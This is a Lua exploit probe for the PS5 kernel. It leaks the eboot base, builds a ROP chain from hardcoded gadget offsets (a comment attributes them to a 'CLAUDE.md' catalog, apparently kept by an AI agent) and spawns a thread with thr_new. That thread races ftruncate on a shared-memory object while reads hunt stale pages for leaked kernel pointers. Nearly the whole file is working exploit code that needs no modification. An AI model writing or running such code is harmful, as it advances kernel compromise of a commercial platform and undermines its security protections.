-- CRASH_CLASS: HIGH
-- PROBE 1102a: SHM ftruncate race with two threads using dword-pair chain writes
--
-- Root cause of 1100a-1100c crashes: memory.write_qword prints old value as
-- binary to stdout. Fix: write chains using two write_dword calls per qword.
-- 1100d proved write_dword is clean (3000 reads, zero binary output).
--
-- Thread A: loops ftruncate(SMALL) then ftruncate(LARGE) on shm fd
-- Thread B (parent Lua): reads boundary pages during the race window
-- If ftruncate invalidates PTEs asynchronously, a read between invalidation
-- and TLB shootdown hits stale/freed pages containing kernel metadata.

print("=== PROBE 1102a: SHM FTRUNCATE RACE (DWORD CHAIN) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

-- Write a qword using two dword writes (avoids binary output bug)
local function wq_safe(addr, val)
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    elseif type(val) == "userdata" then
        local s = tostring(val)
        local n = tonumber(s)
        if n then h = 0; l = n
        else
            local hi_s, lo_s = s:match("^0x(%x+)(%x%x%x%x%x%x%x%x)$")
            if hi_s then h = tonumber(hi_s, 16); l = tonumber(lo_s, 16)
            else h = 0; l = 0 end
        end
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    local addr_n = N(addr)
    wd(addr_n, l)
    wd(addr_n + 4, h)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- Gadgets (from CLAUDE.md confirmed catalog)
local pop_rax_ret   = eaddr(0x992)
local pop_rdi_ret   = eaddr(0xC9DFE)
local pop_rsi_ret   = eaddr(0xD77D)
local bare_ret      = eaddr(0x42)
local fn_addr = uint64(tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)"))

-- Find jmp$ (EB FE) in eboot for thread parking
local jmp_self = nil
for off = 0, 0x100000, 2 do
    local b = rd(tlo + off)
    if b and (b % 0x10000) == 0xFEEB then
        jmp_self = off
        break
    end
end
if jmp_self then
    print(string.format("jmp$=eboot+0x%X", jmp_self))
else
    jmp_self = 0x42
    print("no jmp$ found, using bare_ret")
end

local sc455 = mk(455)
local sc480 = mk(480)
local sc482 = mk(482)
local sc477 = mk(477)

-- Create SHM object
local LARGE = 0x40000   -- 256KB = 16 PS5 pages
local SMALL = 0x4000    -- 16KB = 1 PS5 page

local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
if shm_fd < 0 then print("shm_open FAILED") return end

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))
if map_n == 0 then print("mmap FAILED") return end

-- Write sentinels to all 16 pages
for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end
print("sentinels written")

-- Allocate child stack (64KB via mmap)
local stack = sc477(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local stack_n = N(stack)
print("child_stack=" .. fmt(stack))

-- Fake TCB for child (sysarch SET_FSBASE)
local tcb = memory.alloc(0x1000)
wq_safe(tcb, tcb)  -- self-referencing pointer
local fsb = memory.alloc(8)
wq_safe(fsb, tcb)

-- RSP = ((stack_base + stack_size) & ~0xF) - 8
local rsp = math.floor((stack_n + 0x10000) / 16) * 16 - 8

-- Build ROP chain using DWORD writes (the key fix!)
-- Chain: sysarch(SET_FSBASE) -> 200x (ftruncate SMALL, ftruncate LARGE) -> write marker -> jmp$
local ITERS = 200
local pos = 0

local function chain_qw(val)
    wq_safe(rsp + pos * 8, val)
    pos = pos + 1
end

print(string.format("writing chain (%d iters = %d entries)...", ITERS, 7 + ITERS * 14 + 5))

-- Entry: pop_rax_ret is start_func, RSP[0] is first popped value
-- sysarch(165): SET_FSBASE=129
chain_qw(uint64(165))      -- rax = SYS_SYSARCH
chain_qw(pop_rdi_ret)
chain_qw(uint64(129))      -- rdi = SET_FSBASE
chain_qw(pop_rsi_ret)
chain_qw(uint64(N(fsb)))   -- rsi = &fsb
chain_qw(fn_addr)           -- call syscall stub
chain_qw(pop_rax_ret)       -- next: pop rax for ftruncate

-- Ftruncate loop
for i = 1, ITERS do
    -- ftruncate(shm_fd, SMALL)
    chain_qw(uint64(480))
    chain_qw(pop_rdi_ret)
    chain_qw(uint64(shm_fd))
    chain_qw(pop_rsi_ret)
    chain_qw(uint64(SMALL))
    chain_qw(fn_addr)
    chain_qw(pop_rax_ret)
    -- ftruncate(shm_fd, LARGE)
    chain_qw(uint64(480))
    chain_qw(pop_rdi_ret)
    chain_qw(uint64(shm_fd))
    chain_qw(pop_rsi_ret)
    chain_qw(uint64(LARGE))
    chain_qw(fn_addr)
    chain_qw(pop_rax_ret)
end

-- Done marker: write 0xDEAD1102 to shared flag
local done_flag = memory.alloc(8)
wq_safe(done_flag, uint64(0))
local mov_rdi_rax_ret = eaddr(0x92C67)

chain_qw(uint64(0xDEAD1102))   -- rax = marker value
chain_qw(pop_rdi_ret)
chain_qw(uint64(N(done_flag)))  -- rdi = &done_flag
chain_qw(mov_rdi_rax_ret)       -- *rdi = rax

-- Park thread
chain_qw(eaddr(jmp_self))

print(string.format("chain written: %d entries (%d bytes)", pos, pos * 8))

-- Build thr_param struct (56l pattern)
local tid_ptr = memory.alloc(8)
wq_safe(tid_ptr, uint64(0))

local param = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(param) + i, 0) end
wq_safe(param, pop_rax_ret)                         -- start_func = pop_rax_ret
wq_safe(N(param) + 0x08, uint64(0))                 -- arg (unused)
wq_safe(N(param) + 0x10, stack)                      -- stack_base
wq_safe(N(param) + 0x18, uint64(0x10000))            -- stack_size
wq_safe(N(param) + 0x30, uint64(N(tid_ptr)))         -- child_tid

-- Launch child thread
print("launching child...")
local ok1, ret1 = pcall(function()
    return sc455(uint64(N(param)), uint64(0x38))
end)
print("thr_new=" .. (ok1 and tostring(N(ret1)) or "PCALL-FAIL"))

if not ok1 or N(ret1) ~= 0 then
    print("child launch FAILED")
    print("alive=" .. tostring(alive()))
    print("=== PROBE 1102a FAILED ===")
    return
end

-- Small busy-wait for child to start
local x = 0; for k = 1, 5000 do x = x + k end

local tid = rd(N(tid_ptr))
print("child_tid=" .. (tid or "nil"))

-- RACE: parent reads boundary pages while child ftruncates
print("")
print("--- RACING ---")
local kptr_count = 0
local fault_count = 0
local anomaly_count = 0
local zero_count = 0
local stale_count = 0
local read_count = 0

for round = 1, 2000 do
    -- Read pages 1-7 (these vanish when child ftruncates to SMALL)
    for pg = 1, 7 do
        local off = pg * 0x4000
        local val = rq(uint64(map_n + off))
        read_count = read_count + 1
        if val == nil then
            fault_count = fault_count + 1
            if fault_count <= 5 then
                print(string.format("  [FAULT] round %d page %d", round, pg))
            end
        else
            local h, l = 0, 0
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else l = N(val) end
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 20 then
                    print(string.format("  [KPTR!] round %d pg %d: 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            else
                local exp = 0xAA000000 + pg
                if l ~= exp or h ~= (0xBB000000 + pg) then
                    anomaly_count = anomaly_count + 1
                    if anomaly_count <= 20 then
                        print(string.format("  [ANOM] round %d pg %d: 0x%08X%08X (exp 0x%08X%08X)",
                            round, pg, h, l, 0xBB000000 + pg, exp))
                    end
                end
            end
        end
    end

    -- Check done
    local df = rd(N(done_flag))
    if df and df == 0xDEAD1102 then
        print(string.format("child done after round %d", round))
        break
    end

    -- Re-write sentinels for pages that got zeroed
    for pg = 1, 7 do
        wd(map_n + pg * 0x4000, 0xAA000000 + pg)
        wd(map_n + pg * 0x4000 + 4, 0xBB000000 + pg)
    end
end

print("")
print(string.format("RESULTS: reads=%d faults=%d kptrs=%d anomalies=%d zeros=%d stale=%d",
    read_count, fault_count, kptr_count, anomaly_count, zero_count, stale_count))
print("alive=" .. tostring(alive()))
print("")
print("=== PROBE 1102a COMPLETE ===")
